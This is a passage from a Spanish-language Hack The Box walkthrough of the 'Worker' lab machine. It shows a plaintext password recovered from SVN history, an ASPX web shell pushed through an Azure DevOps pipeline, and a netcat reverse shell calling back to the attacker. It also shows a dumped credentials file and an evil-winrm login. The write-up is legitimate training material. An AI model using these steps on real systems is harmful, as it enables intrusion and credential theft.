   <span class="nb">cat
   </span>changelist <span class="o">(</span>cl<span class="o">)</span>
   checkout <span class="o">(</span>co<span class="o">)</span>
   cleanup
   commit <span class="o">(</span>ci<span class="o">)</span>
   copy <span class="o">(</span><span class="nb">cp</span><span class="o">)</span>
   delete <span class="o">(</span>del, remove, <span class="nb">rm</span><span class="o">)</span>
   diff <span class="o">(</span>di<span class="o">)</span>
   <span class="nb">export
   help</span> <span class="o">(</span>?, h<span class="o">)</span>
   import
   info
   list <span class="o">(</span><span class="nb">ls</span><span class="o">)</span>
   lock
   log
   merge
   mergeinfo
   <span class="nb">mkdir
   </span>move <span class="o">(</span><span class="nb">mv</span>, rename, ren<span class="o">)</span>
   patch
   propdel <span class="o">(</span>pdel, pd<span class="o">)</span>
   propedit <span class="o">(</span>pedit, pe<span class="o">)</span>
   propget <span class="o">(</span>pget, pg<span class="o">)</span>
   proplist <span class="o">(</span>plist, pl<span class="o">)</span>
   propset <span class="o">(</span>pset, ps<span class="o">)</span>
   relocate
   resolve
   resolved
   revert
   status <span class="o">(</span><span class="nb">stat</span>, st<span class="o">)</span>
   switch <span class="o">(</span>sw<span class="o">)</span>
   unlock
   update <span class="o">(</span>up<span class="o">)</span>
   upgrade

Subversion is a tool <span class="k">for </span>version control.
For additional information, see http://subversion.apache.org/
</code></pre></div></div>

<ul>
  <li>Podemos listar lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">ls </span>svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div></div>

<ul>
  <li>Tambien nos dicen que podemos descargar el repositorio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn checkout svn://10.10.10.203
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
A    dimension.worker.htb/assets/js/jquery.min.js
A    dimension.worker.htb/assets/js/main.js
A    dimension.worker.htb/assets/js/util.js
A    dimension.worker.htb/assets/sass
A    dimension.worker.htb/assets/sass/base
A    dimension.worker.htb/assets/sass/base/_page.scss
A    dimension.worker.htb/assets/sass/base/_reset.scss
A    dimension.worker.htb/assets/sass/base/_typography.scss
A    dimension.worker.htb/assets/sass/components
A    dimension.worker.htb/assets/sass/components/_actions.scss
A    dimension.worker.htb/assets/sass/components/_box.scss
A    dimension.worker.htb/assets/sass/components/_button.scss
A    dimension.worker.htb/assets/sass/components/_form.scss
A    dimension.worker.htb/assets/sass/components/_icon.scss
A    dimension.worker.htb/assets/sass/components/_icons.scss
A    dimension.worker.htb/assets/sass/components/_image.scss
A    dimension.worker.htb/assets/sass/components/_list.scss
A    dimension.worker.htb/assets/sass/components/_table.scss
A    dimension.worker.htb/assets/sass/layout
A    dimension.worker.htb/assets/sass/layout/_bg.scss
A    dimension.worker.htb/assets/sass/layout/_footer.scss
A    dimension.worker.htb/assets/sass/layout/_header.scss
A    dimension.worker.htb/assets/sass/layout/_main.scss
A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    dimension.worker.htb/assets/sass/libs
A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    dimension.worker.htb/assets/sass/libs/_functions.scss
A    dimension.worker.htb/assets/sass/libs/_mixins.scss
A    dimension.worker.htb/assets/sass/libs/_vars.scss
A    dimension.worker.htb/assets/sass/libs/_vendor.scss
A    dimension.worker.htb/assets/sass/main.scss
A    dimension.worker.htb/assets/sass/noscript.scss
A    dimension.worker.htb/assets/webfonts
A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
</code></pre></div></div>

<ul>
  <li>Si vemos lo que dice <code class="language-plaintext highlighter-rouge">moved.txt</code> nos dan un subdominio nos hablan sobre una versión final.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que en caso de que sea alguna pagina web nos pueda resolver.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.203 devops.worker.htb dimension.worker.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<ul>
  <li>Nos pide credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/3.png" />
</p>

<ul>
  <li>En el otro subdominio solo encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/4.png" />
</p>

<ul>
  <li>Esto es todo lo que contiene.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb tree
<span class="nb">.</span>
├── LICENSE.txt
├── README.txt
├── assets
│   ├── css
│   │   ├── fontawesome-all.min.css
│   │   ├── main.css
│   │   └── noscript.css
│   ├── js
│   │   ├── breakpoints.min.js
│   │   ├── browser.min.js
│   │   ├── jquery.min.js
│   │   ├── main.js
│   │   └── util.js
│   ├── sass
│   │   ├── base
│   │   │   ├── _page.scss
│   │   │   ├── _reset.scss
│   │   │   └── _typography.scss
│   │   ├── components
│   │   │   ├── _actions.scss
│   │   │   ├── _box.scss
│   │   │   ├── _button.scss
│   │   │   ├── _form.scss
│   │   │   ├── _icon.scss
│   │   │   ├── _icons.scss
│   │   │   ├── _image.scss
│   │   │   ├── _list.scss
│   │   │   └── _table.scss
│   │   ├── layout
│   │   │   ├── _bg.scss
│   │   │   ├── _footer.scss
│   │   │   ├── _header.scss
│   │   │   ├── _main.scss
│   │   │   └── _wrapper.scss
│   │   ├── libs
│   │   │   ├── _breakpoints.scss
│   │   │   ├── _functions.scss
│   │   │   ├── _mixins.scss
│   │   │   ├── _vars.scss
│   │   │   └── _vendor.scss
│   │   ├── main.scss
│   │   └── noscript.scss
│   └── webfonts
│       ├── fa-brands-400.eot
│       ├── fa-brands-400.svg
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.eot
│       ├── fa-regular-400.svg
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.eot
│       ├── fa-solid-900.svg
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff
│       └── fa-solid-900.woff2
├── images
│   ├── bg.jpg
│   ├── overlay.png
│   ├── pic01.jpg
│   ├── pic02.jpg
│   └── pic03.jpg
└── index.html

11 directories, 55 files
</code></pre></div></div>

<ul>
  <li>Aquí podemos ver el <code class="language-plaintext highlighter-rouge">Commit history</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r5 | nathen | 2020-06-20 08:52:00 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Added note that repo has been migrated
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
r3 | nathen | 2020-06-20 08:46:19 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

-
<span class="nt">------------------------------------------------------------------------</span>
r2 | nathen | 2020-06-20 08:45:16 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Added deployment script
<span class="nt">------------------------------------------------------------------------</span>
r1 | nathen | 2020-06-20 08:43:43 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

First version
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Este es interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-r</span> 4 svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>El archivo <code class="language-plaintext highlighter-rouge">deploy.ps1</code> fue eliminado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-v</span> <span class="nt">-r</span> 4 svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
Changed paths:
   D /deploy.ps1

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Si revisamos cambios que se realizaron en ese archivo antes de ser eliminado vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn diff <span class="nt">-r</span> 2:3 svn://10.10.10.203/deploy.ps1

Index: deploy.ps1
<span class="o">===================================================================</span>
<span class="nt">---</span> deploy.ps1	<span class="o">(</span>revision 2<span class="o">)</span>
+++ deploy.ps1	<span class="o">(</span>revision 3<span class="o">)</span>
@@ <span class="nt">-1</span>,6 +1,7 @@
 <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"nathen"</span>
-<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">"wendel98"</span>
+# NOTE: We cant have my password here!!!
+<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">""</span>
 <span class="nv">$pwd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$plain</span> | ConvertTo-SecureString<span class="o">)</span>
 <span class="nv">$Credential</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="nv">$user</span>, <span class="nv">$pwd</span>
 <span class="nv">$args</span> <span class="o">=</span> <span class="s2">"Copy-Site.ps1"</span>
<span class="nt">-Start-Process</span> powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
+Start-Process powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
<span class="se">\ </span>No newline at end of file
</code></pre></div></div>

<ul>
  <li>Si las probamos en el sitio web vemos que son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/5.png" />
</p>

<h2 id="shell-as-defaultapppool">Shell as defaultapppool</h2>

<ul>
  <li>Vemos varios repositorios al parecer son los subdominios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/6.png" />
</p>

<ul>
  <li>
    <p>Como tenemos acceso podemos subir un <code class="language-plaintext highlighter-rouge">.aspx</code> para ganar acceso <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</a>.</p>
  </li>
  <li>
    <p>Si lo intentamos subir no nos deja.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/7.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que tenemos que hacer un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</p>
  </li>
  <li>
    <p>Vamos a crear una nueva rama.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/8.png" />
</p>

<ul>
  <li>Si subimos el archivo vemos que ahora si se puede.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/9.png" />
</p>

<ul>
  <li>Vamos a crear un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/10.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/11.png" />
</p>

<ul>
  <li>Ahora lo aprobamos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/12.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/13.png" />
</p>

<ul>
  <li>Pero no vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/14.png" />
</p>

<ul>
  <li>
    <p>Podemos aprovecharnos de los Pipeline <a href="https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline">https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline</a>.</p>
  </li>
  <li>
    <p>Si le damos en Run vemos que podemos construir una.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/15.png" />
</p>

<ul>
  <li>
    <p>Bueno nos da un error y esto es por que al parecer la otra rama fue eliminada yo creo entonces tenemos que hacerlo rápido lo que vamos hacer es crear todo otra vez y subir el <code class="language-plaintext highlighter-rouge">cmd.aspx</code> hacer los mismos pasos pero ahora con la nueva rama.</p>
  </li>
  <li>
    <p>Y vemos que ya se puede.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/16.png" />
</p>

<ul>
  <li>Bueno ahora solo falta agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n1</span>
10.10.10.203 devops.worker.htb dimension.worker.htb alpha.worker.htb
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/17.png" />
</p>

<ul>
  <li>
    <p>Ahora vamos a ganar acceso.</p>
  </li>
  <li>
    <p>Vamos a usar el <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora simplemente hacemos una petición con <code class="language-plaintext highlighter-rouge">curl</code> para descargamos el nc.exe y ponerlo en esa ruta del sistema.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/18.png" />
</p>

<ul>
  <li>Ahora ya nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd tuip 443
</code></pre></div></div>

<ul>
  <li>Nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 50333
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
<span class="nb">whoami
</span>iis apppool<span class="se">\d</span>efaultapppool

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<h2 id="shell-as-robisl">Shell as robisl</h2>

<ul>
  <li>Aquí vemos unidades logicas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;net share
net share

Share name   Resource                        Remark

<span class="nt">-------------------------------------------------------------------------------</span>
C<span class="nv">$ </span>          C:<span class="se">\ </span>                            Default share
IPC<span class="nv">$ </span>                                        Remote IPC
W<span class="nv">$ </span>          W:<span class="se">\ </span>                            Default share
ADMIN<span class="nv">$ </span>      C:<span class="se">\W</span>indows                      Remote Admin
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;w:
w:

W:<span class="se">\&gt;</span><span class="nb">dir
dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\</span>

2020-06-16  18:59    &lt;DIR&gt;          agents
2020-03-28  15:57    &lt;DIR&gt;          AzureDevOpsData
2020-04-03  11:31    &lt;DIR&gt;          sites
2020-06-20  16:04    &lt;DIR&gt;          svnrepos
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               4 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">passwd</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\&gt;</span><span class="nb">cd </span>svnrepos
<span class="nb">cd </span>svnrepos

W:<span class="se">\s</span>vnrepos&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos

2020-06-20  16:04    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  16:04    &lt;DIR&gt;          ..
2020-06-20  11:29    &lt;DIR&gt;          www
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               3 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos&gt;cd www
<span class="nb">cd </span>www

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww

2020-06-20  11:29    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  11:29    &lt;DIR&gt;          ..
2020-06-20  15:30    &lt;DIR&gt;          conf
2020-06-20  15:52    &lt;DIR&gt;          db
2020-06-20  11:29                 2 format
2020-06-20  11:29    &lt;DIR&gt;          hooks
2020-06-20  11:29    &lt;DIR&gt;          locks
2020-06-20  11:29               251 README.txt
               2 File<span class="o">(</span>s<span class="o">)</span>            253 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;cd conf
<span class="nb">cd </span>conf

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf

2020-06-20  15:30    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  15:30    &lt;DIR&gt;          ..
2020-06-20  11:29             1112 authz
2020-06-20  11:29               904 hooks-env.tmpl
2020-06-20  15:27             1031 passwd
2020-04-04  20:51             4454 svnserve.conf
               4 File<span class="o">(</span>s<span class="o">)</span>          7501 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>Vemos usuarios y contraseñas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;type passwd
<span class="nb">type </span>passwd
<span class="c">### This file is an example password file for svnserve.</span>
<span class="c">### Its format is similar to that of svnserve.conf. As shown in the</span>
<span class="c">### example below it contains one section labelled [users].</span>
<span class="c">### The name and password for each user follow, one account per line.</span>

<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
nathen <span class="o">=</span> wendel98
nichin <span class="o">=</span> fqerfqerf
nichin <span class="o">=</span> asifhiefh
noahip <span class="o">=</span> player
nuahip <span class="o">=</span> wkjdnw
oakhol <span class="o">=</span> bxwdjhcue
owehol <span class="o">=</span> supersecret
paihol <span class="o">=</span> painfulcode
parhol <span class="o">=</span> gitcommit
pathop <span class="o">=</span> iliketomoveit
pauhor <span class="o">=</span> nowayjose
payhos <span class="o">=</span> icanjive
perhou <span class="o">=</span> elvisisalive
peyhou <span class="o">=</span> ineedvacation
phihou <span class="o">=</span> pokemon
quehub <span class="o">=</span> pickme
quihud <span class="o">=</span> kindasecure
rachul <span class="o">=</span> guesswho
raehun <span class="o">=</span> idontknow
ramhun <span class="o">=</span> thisis
ranhut <span class="o">=</span> getting
rebhyd <span class="o">=</span> rediculous
reeinc <span class="o">=</span> iagree
reeing <span class="o">=</span> tosomepoint
reiing <span class="o">=</span> isthisenough
renipr <span class="o">=</span> dummy
rhiire <span class="o">=</span> <span class="nb">users
</span>riairv <span class="o">=</span> canyou
ricisa <span class="o">=</span> seewhich
robish <span class="o">=</span> onesare
robisl <span class="o">=</span> wolves11
robive <span class="o">=</span> andwhich
ronkay <span class="o">=</span> onesare
rubkei <span class="o">=</span> the
rupkel <span class="o">=</span> sheeps
ryakel <span class="o">=</span> imtired
sabken <span class="o">=</span> drjones
samken <span class="o">=</span> aqua
sapket <span class="o">=</span> hamburger
sarkil <span class="o">=</span> friday

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que el único usuario de interés es <code class="language-plaintext highlighter-rouge">robisl</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir C:<span class="se">\U</span>sers<span class="se">\</span>
<span class="nb">dir </span>C:<span class="se">\U</span>sers<span class="se">\</span>
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:<span class="se">\U</span>sers

2020-07-07  17:53    &lt;DIR&gt;          <span class="nb">.</span>
2020-07-07  17:53    &lt;DIR&gt;          ..
2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5
2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5 Classic
2020-08-18  00:33    &lt;DIR&gt;          Administrator
2020-03-28  15:01    &lt;DIR&gt;          Public
2020-07-22  01:11    &lt;DIR&gt;          restorer
2020-07-08  19:22    &lt;DIR&gt;          robisl
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               8 Dir<span class="o">(</span>s<span class="o">)</span>  10459025408 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>El usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;net user robisl
net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2020-08-03 12:41:02

Logon hours allowed          All

Local Group Memberships      *Production           *Remote Management Use
Global Group memberships     *None
The command completed successfully.


W:\svnrepos\www\conf&gt;
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ahora ya nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.203 <span class="nt">-u</span> <span class="s1">'robisl'</span> <span class="nt">-p</span> <span class="s1">'wolves11'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>worker<span class="se">\r</span>obisl
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
2ce8a9d7ff7736acc3469f7274b2006a
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos ningún privilegio ni nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name     SID
<span class="o">=============</span> <span class="o">==============================================</span>
worker<span class="se">\r</span>obisl S-1-5-21-3082756831-2119193761-3468718151-1330


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                             Type             SID                                            Attributes
<span class="o">======================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">==================================================</span>
Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
WORKER<span class="se">\P</span>roduction                      Alias            S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                   Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\L</span>ocal account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
